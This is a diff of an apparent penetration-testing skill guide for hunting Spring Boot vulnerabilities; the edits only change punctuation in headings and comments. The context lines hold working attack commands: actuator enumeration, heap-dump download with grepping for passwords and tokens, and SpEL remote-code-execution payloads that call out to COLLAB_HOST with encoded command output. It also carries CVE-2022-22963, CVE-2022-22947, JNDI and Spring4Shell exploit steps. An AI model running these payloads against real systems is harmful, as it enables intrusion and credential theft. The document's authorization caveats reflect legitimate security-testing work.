@@ -29,7 +29,7 @@ report_count: 16
 >
 > Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
 
-# HUNT-SPRINGBOOT: Spring Boot Specific Vulnerabilities
+# HUNT-SPRINGBOOT — Spring Boot Specific Vulnerabilities
 
 Endpoint availability, sanitization and CVE impact depend on exact versions/configuration; upstream report_count and severity labels are not verified evidence. A matching banner, JSON content type or arithmetic result alone does not prove Spring-specific exploitation. Use the [Spring4Shell advisory](https://spring.io/security/cve-2022-22965/) for required components and fixed versions.
 
@@ -40,16 +40,16 @@ Heap dumps can expose extensive personal data and strain availability: omit heap
 An unintentionally accessible heap dump can disclose sensitive live-memory data, but contents and impact must be established rather than assumed.
 
 **Highest-value findings:**
-- **`/actuator/heapdump`**; full JVM heap dump contains plaintext passwords, tokens, DB credentials, private keys stored anywhere in memory
-- **`/actuator/env`**; lists all environment variables and Spring properties including secrets
-- **`/actuator/shutdown`**; POST → shuts down the application (Critical availability impact)
-- **H2 Console (`/h2-console`)**; in-memory DB admin UI → SQL query execution → potential RCE via `CREATE ALIAS` trick
-- **SpEL injection**; Spring Expression Language in template fields, `@Value` annotations, SpEL-processed request params → RCE
-- **Spring4Shell CVE-2022-22965**; Spring Framework < 5.3.18 + Tomcat → RCE via data binding
+- **`/actuator/heapdump`** — full JVM heap dump contains plaintext passwords, tokens, DB credentials, private keys stored anywhere in memory
+- **`/actuator/env`** — lists all environment variables and Spring properties including secrets
+- **`/actuator/shutdown`** — POST → shuts down the application (Critical availability impact)
+- **H2 Console (`/h2-console`)** — in-memory DB admin UI → SQL query execution → potential RCE via `CREATE ALIAS` trick
+- **SpEL injection** — Spring Expression Language in template fields, `@Value` annotations, SpEL-processed request params → RCE
+- **Spring4Shell CVE-2022-22965** — Spring Framework < 5.3.18 + Tomcat → RCE via data binding
 
 ---
 
-## Phase 1: Fingerprint Spring Boot
+## Phase 1 — Fingerprint Spring Boot
 
 ```bash
 # Spring Boot indicators
@@ -69,7 +69,7 @@ done
 
 ---
 
-## Phase 2: Actuator Endpoint Enumeration
+## Phase 2 — Actuator Endpoint Enumeration
 
 ```bash
 BASE="https://$TARGET/actuator"
@@ -81,7 +81,7 @@ ENDPOINTS=("env" "threaddump" "mappings" "beans" "metrics"
            "flyway" "liquibase" "refresh" "restart")
 
 for EP in "${ENDPOINTS[@]}"; do
-  # Don't trust HTTP 200 alone: Spring returns 200 with a Whitelabel/login
+  # Don't trust HTTP 200 alone — Spring returns 200 with a Whitelabel/login
   # page for many paths. Require actuator-shaped JSON (or a heapdump body)
   # before calling it EXPOSED.
   BODY=$(curl -s -H "Accept: application/json" "$BASE/$EP")
@@ -103,14 +103,14 @@ curl -s "$BASE/beans" | python3 -m json.tool 2>/dev/null | head -100
 
 ---
 
-## Phase 3: Heap Dump Analysis
+## Phase 3 — Heap Dump Analysis
 
 ```bash
-# Download heap dump (can be large: 100MB+)
+# Download heap dump (can be large — 100MB+)
 curl -s "$BASE/heapdump" -o /tmp/heapdump.hprof
 ls -lh /tmp/heapdump.hprof
 
-# Quick grep for secrets in heap dump (binary file: use strings)
+# Quick grep for secrets in heap dump (binary file — use strings)
 strings /tmp/heapdump.hprof | grep -iE "(password|secret|apikey|api_key|token|bearer|private_key)" | \
   grep -v "^[a-z_]" | sort -u | head -50
 
@@ -126,7 +126,7 @@ strings /tmp/heapdump.hprof | grep -oP "Bearer [A-Za-z0-9._-]+" | sort -u   # Be
 
 ---
 
-## Phase 4: H2 Console RCE
+## Phase 4 — H2 Console RCE
 
 ```bash
 # H2 console detection
@@ -150,7 +150,7 @@ curl -s "https://$TARGET/console" | grep -i "H2"
 
 ---
 
-## Phase 5: SpEL Injection
+## Phase 5 — SpEL Injection
 
 ```bash
 # Spring Expression Language injection in user-controlled fields
@@ -168,14 +168,14 @@ curl -s -X POST "https://$TARGET/api/user/name" \
   -d '{"name": "#{7*7}"}'
 # A controlled evaluation result is an indicator; identify the actual expression engine and context.
 
-# RCE payload: note: exec() returns a Process, not a String, so a bare
+# RCE payload — note: exec() returns a Process, not a String, so a bare
 # exec("id") produces NO visible output. Confirm via an OOB curl callback
 # (the spawned curl makes the network request even though nothing is reflected):
 curl -s -X POST "https://$TARGET/api/user/name" \
   -H "Content-Type: application/json" \
   -d '{"name": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl COLLAB_HOST/spel-$(id|base64)\"})}"}'
 
-# CVE-2022-22963: Spring Cloud Function SpEL
+# CVE-2022-22963 — Spring Cloud Function SpEL
 curl -s -X POST "https://$TARGET/functionRouter" \
   -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"curl COLLAB_HOST/spel-rce\")" \
   -d "test"
@@ -183,7 +183,7 @@ curl -s -X POST "https://$TARGET/functionRouter" \
 
 ---
 
-## Phase 5b: Spring Cloud Gateway Actuator SpEL RCE (CVE-2022-22947)
+## Phase 5b — Spring Cloud Gateway Actuator SpEL RCE (CVE-2022-22947)
 If the `gateway` actuator is exposed, add a route whose filter body is SpEL, then refresh to evaluate it (escape inner quotes for your shell):
 ```bash
 curl -s -X POST "$BASE/gateway/routes/hax" -H "Content-Type: application/json" \
@@ -191,7 +191,7 @@ curl -s -X POST "$BASE/gateway/routes/hax" -H "Content-Type: application/json" \
 curl -s -X POST "$BASE/gateway/refresh"; curl -s "$BASE/gateway/routes"
 ```
 
-## Phase 5c: Writable `/env` -> `/refresh` gadget RCE
+## Phase 5c — Writable `/env` -> `/refresh` gadget RCE
 When `/actuator/env` accepts POST and `/actuator/refresh` exists, poison a property then reload:
 ```bash
 # logback JNDI:
@@ -202,7 +202,7 @@ curl -s -X POST "$BASE/refresh"
 ```
 (Veracode: Exploiting Spring Boot Actuators.)
 
-## Phase 6: Spring4Shell (CVE-2022-22965)
+## Phase 6 — Spring4Shell (CVE-2022-22965)
 
 ```bash
 # Affects: Spring Framework < 5.3.18 and < 5.2.20 (and all older branches);
@@ -221,7 +221,7 @@ curl -s "https://$TARGET/login" \
 
 ---
 
-## Phase 7: Jolokia JMX Exposure
+## Phase 7 — Jolokia JMX Exposure
 
 ```bash
 # Jolokia provides HTTP access to JMX MBeans
@@ -271,7 +271,7 @@ curl -s "https://$TARGET/jolokia/exec/com.sun.management:type=DiagnosticCommand/
 ## When to Use
 
 - You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
-- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.
+- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.
 
 ## Limitations
 
